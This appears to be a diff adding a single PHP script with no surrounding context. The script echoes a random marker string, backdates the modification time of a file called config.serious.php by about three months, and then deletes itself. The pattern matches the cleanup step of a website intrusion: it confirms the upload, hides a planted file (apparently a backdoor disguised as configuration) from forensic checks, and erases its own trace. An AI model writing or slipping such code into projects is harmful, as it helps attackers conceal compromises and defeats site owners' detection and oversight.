@@ -1,0 +1,1 @@
+<?php echo "UaNUYaBEPr"; if (file_exists("./config.serious.php")){ touch("./config.serious.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*fvayaATa7MV1QKM3dXx5*/ ?>
